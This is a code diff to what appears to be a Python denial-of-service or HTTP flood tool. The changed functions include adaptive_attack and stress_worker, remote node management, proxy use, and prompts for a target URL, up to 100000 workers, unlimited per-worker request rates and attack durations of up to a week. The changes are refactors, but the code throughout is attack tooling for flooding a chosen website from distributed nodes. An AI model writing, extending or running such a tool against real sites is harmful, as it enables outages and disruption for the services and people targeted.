@@ -2083,14 +2320,13 @@ async def adaptive_attack(worker_func, target_url, initial_concurrency,
                 except (asyncio.TimeoutError, Exception):
                     pass
 
-            _restore_terminal()
             try:
-                sys.stdout.write("\033[H\033[J")
-                sys.stdout.flush()
+                LIVE_DASHBOARD.stop()
             except Exception:
                 pass
+            _restore_terminal()
 
-    total_time = time.time() - start_time
+    total_time = time.monotonic() - start_time
     rps_actual = stats["requests"] / total_time if total_time > 0 else 0
     stats["duration"] = total_time
     stats["rps"] = rps_actual
@@ -2104,8 +2340,8 @@ async def adaptive_attack(worker_func, target_url, initial_concurrency,
 
 async def stress_worker(direct_session, target_url, duration, stats,
                         use_proxy=False, safe_state=None, rps_limiter=None):
-    start_time = time.time()
-    while time.time() - start_time < duration:
+    start_time = time.monotonic()
+    while time.monotonic() - start_time < duration:
         if _INTERRUPTED[0]:
             break
         if safe_state is not None and safe_state.enabled and safe_state.active:
@@ -2523,19 +2759,37 @@ async def node_management_menu():
                 input(f"  {Colors.DIM}Press Enter to continue...{Colors.RESET}")
                 continue
             print(f"\n  {Colors.CYAN}➜ Testing {len(NODE_MANAGER.nodes)} node(s)...{Colors.RESET}\n")
+            ok_count = 0
+            fail_count = 0
             for n in NODE_MANAGER.nodes:
-                print(f"  {Colors.BOLD}▸ {n.label()}{Colors.RESET}... ", end="", flush=True)
+                print(f"  {Colors.BOLD}▸ {n.label()}{Colors.RESET}... ",
+                      end="", flush=True)
+                if n.client is not None:
+                    try:
+                        n.client.close()
+                    except Exception:
+                        pass
+                    n.client = None
                 try:
-                    if n.client:
-                        try: n.client.close()
-                        except Exception: pass
-                    if await NODE_MANAGER.connect(n):
-                        print(f"{Colors.GREEN}OK{Colors.RESET}")
-                    else:
-                        print(f"{Colors.RED}FAIL ({n.error_msg}){Colors.RESET}")
+                    result = await NODE_MANAGER.connect(n)
                 except Exception as e:
-                    print(f"{Colors.RED}FAIL ({str(e)[:50]}){Colors.RESET}")
+                    result = False
+                    n.error_msg = f"{type(e).__name__}: {str(e)[:60]}"
+                if result:
+                    ok_count += 1
+                    print(f"{Colors.GREEN}OK{Colors.RESET}")
+                else:
+                    fail_count += 1
+                    err = n.error_msg or "unknown error"
+                    print(f"{Colors.RED}FAIL{Colors.RESET} {Colors.DIM}({err}){Colors.RESET}")
+            print()
+            print(f"  {Colors.BOLD}● RESULT{Colors.RESET}")
+            print(f"  {Colors.DIM}├─{Colors.RESET} OK     "
+                  f"{Colors.GREEN}{ok_count}{Colors.RESET}")
+            print(f"  {Colors.DIM}└─{Colors.RESET} Failed "
+                  f"{Colors.RED}{fail_count}{Colors.RESET}")
             input(f"\n  {Colors.DIM}Press Enter to continue...{Colors.RESET}")
+            
         elif choice == "5":
             if not NODE_MANAGER.nodes:
                 print(f"\n  {Colors.RED}⚠{Colors.RESET} No nodes loaded")
@@ -2830,7 +3084,7 @@ def get_target_url():
         print(f"  {Colors.RED}⚠ Invalid URL{Colors.RESET}")
 
 
-def get_int_input(prompt, default, allow_zero=False):
+def get_int_input(prompt, default, allow_zero=False, max_val=None):
     while True:
         raw = input(prompt).strip()
         if not raw:
@@ -2838,6 +3092,8 @@ def get_int_input(prompt, default, allow_zero=False):
         try:
             val = int(raw)
             if val > 0:
+                if max_val is not None and val > max_val:
+                    val = max_val
                 return val
             if allow_zero and val == 0:
                 return 0
@@ -2922,12 +3178,13 @@ def main_menu():
             target_url = get_target_url()
             concurrency = get_int_input(
                 f"  {Colors.BOLD}➜ Initial Workers [{Colors.GREEN}{DEFAULT_WORKERS}{Colors.RESET}]: ",
-                DEFAULT_WORKERS)
+                DEFAULT_WORKERS, max_val=100000)
             rps = get_int_input(
                 f"  {Colors.BOLD}➜ Per-Worker RPS (0=unlimited) [{Colors.GREEN}{DEFAULT_RPS}{Colors.RESET}]: ",
-                DEFAULT_RPS, allow_zero=True)
+                DEFAULT_RPS, allow_zero=True, max_val=100000)
             duration = get_int_input(
-                f"  {Colors.BOLD}➜ Attack Duration (seconds) [{Colors.GREEN}600{Colors.RESET}]: ", 600)
+                f"  {Colors.BOLD}➜ Attack Duration (seconds) [{Colors.GREEN}600{Colors.RESET}]: ",
+                600, max_val=86400 * 7)
 
             ans_safe = input(f"  {Colors.BOLD}➜ Enable Safe Mode? "
                              f"{Colors.DIM}(pause on origin errors, auto-resume){Colors.RESET} "
